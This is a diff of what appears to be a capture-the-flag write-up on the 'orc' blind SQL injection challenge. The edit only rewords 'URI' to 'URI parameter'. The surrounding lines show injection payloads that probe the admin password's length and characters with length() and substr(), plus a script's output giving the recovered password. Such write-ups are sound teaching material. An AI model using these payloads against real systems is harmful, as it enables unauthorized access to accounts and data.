@@ -27,7 +27,7 @@ First we have to reveal the length of the flag.
 
 ### Retrieving the password length
 
-If we provide the following URI:
+If we provide the following URI parameter:
 
 ```
 ?pw=' OR id='admin' AND length(pw)=1 -- -
@@ -50,7 +50,7 @@ SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND leng
 Since the `Hello admin` message is not printed, we know that the resultant query did not result in `True`.
 That tells us that the length of the `pw` column is more than 1.
 
-If we keep increasing the length and provide the following URI:
+If we keep increasing the length and provide the following URI parameter:
 
 ```
 ?pw=' OR id='admin' AND length(pw)=8 -- -
@@ -81,7 +81,7 @@ Next, we can leak the password byte by byte using the `substr()` function.
 
 ![4](https://github.com/Kunull/Write-ups/assets/110326359/e332b358-2371-4f97-a9be-e1e5afce6f68)
 
-If we provide the following URI:
+If we provide the following URI parameter:
 
 ```
 ?pw=' OR id='admin' AND substr(pw, 1, 1)='0' -- -
@@ -252,7 +252,7 @@ $ python .\orc_script.py
 [!] Final payload: ?pw=095a9852
 ```
 
-Now, we can provide password URI:
+Now, we can provide password URI parameter:
 
 ```
 ?pw=095a9852
